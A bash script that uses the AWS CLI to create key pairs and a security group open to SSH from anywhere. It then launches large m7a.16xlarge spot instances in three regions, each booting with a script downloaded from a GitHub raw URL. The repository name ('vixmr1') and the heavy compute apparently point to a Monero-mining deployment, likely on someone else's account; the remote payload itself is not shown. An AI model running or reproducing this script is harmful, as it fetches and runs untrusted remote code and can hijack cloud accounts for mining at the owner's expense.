#!/bin/bash

# List of regions and corresponding AMI IDs
declare -A region_image_map=(
    ["us-east-1"]="ami-0885b1f6bd170450c"
    ["us-west-2"]="ami-0f2b111c5c9eb30c8"
    ["us-east-2"]="ami-0a49b025fffbbdac6"
)

# URL containing User Data on GitHub
user_data_url="https://raw.githubusercontent.com/thines8899/vixmr1/refs/heads/main/vikucon"

# Path to User Data file
user_data_file="/tmp/user_data.sh"

# Download User Data from GitHub
echo "Downloading user-data from GitHub..."
curl -s -L "$user_data_url" -o "$user_data_file"

# Check if file exists and is not empty
if [ ! -s "$user_data_file" ] || [ ! -r "$user_data_file" ]; then
    echo "Error: Failed to download or access user-data from GitHub."
    exit 1
fi

# Encode User Data to base64 for AWS use
user_data_base64=$(base64 "$user_data_file" | tr -d '\n')

# Iterate over each region
for region in "${!region_image_map[@]}"; do
    echo "Processing region: $region"

    # Get the image ID for the region
    image_id=${region_image_map[$region]}

    # Check if Key Pair exists
    key_name="MrThin-$region"
    if aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" > /dev/null 2>&1; then
        echo "Key Pair $key_name already exists in $region"
    else
        aws ec2 create-key-pair \
            --key-name "$key_name" \
            --region "$region" \
            --query "KeyMaterial" \
            --output text > "${key_name}.pem"
        if [ $? -ne 0 ]; then
            echo "Error: Failed to create Key Pair $key_name in $region"
            exit 1
        fi
        chmod 400 "${key_name}.pem"
        echo "Key Pair $key_name created in $region"
    fi

    # Check if Security Group exists
    sg_name="Random-$region"
    sg_id=$(aws ec2 describe-security-groups --group-names "$sg_name" --region "$region" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)

    if [ -z "$sg_id" ]; then
        sg_id=$(aws ec2 create-security-group \
            --group-name "$sg_name" \
            --description "Security group for $region" \
            --region "$region" \
            --query "GroupId" \
            --output text)
        if [ $? -ne 0 ]; then
            echo "Error: Failed to create Security Group $sg_name in $region"
            exit 1
        fi
        echo "Security Group $sg_name created with ID $sg_id in $region"
    else
        echo "Security Group $sg_name already exists with ID $sg_id in $region"
    fi

    # Ensure SSH (22) port is open
    if ! aws ec2 describe-security-group-rules --region "$region" --filters Name=group-id,Values="$sg_id" Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
        aws ec2 authorize-security-group-ingress \
            --group-id "$sg_id" \
            --protocol tcp \
            --port 22 \
            --cidr 0.0.0.0/0 \
            --region "$region"
        if [ $? -ne 0 ]; then
            echo "Error: Failed to authorize SSH (22) access for Security Group $sg_name in $region"
            exit 1
        fi
        echo "SSH (22) access enabled for Security Group $sg_name in $region"
    else
        echo "SSH (22) access already configured for Security Group $sg_name in $region"
    fi

    # Launch 1 Spot EC2 Instance
    instance_id=$(aws ec2 run-instances \
        --instance-type "m7a.16xlarge" \
        --image-id "$image_id" \
        --key-name "$key_name" \
        --security-group-ids "$sg_id" \
        --iam-instance-profile Name="instance-profile-name" \
        --user-data "$user_data_base64" \
        --instance-market-options "MarketType=spot,SpotOptions={SpotInstanceType=one-time}" \
        --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=SpotInstance}]' \
        --query "Instances[0].InstanceId" \
        --region "$region" \
        --output text)
    if [ $? -ne 0 ]; then
        echo "Error: Failed to launch Spot Instance in region $region"
        exit 1
    fi
    echo "Spot Instance $instance_id created in $region using Key Pair $key_name and Security Group $sg_name"
done
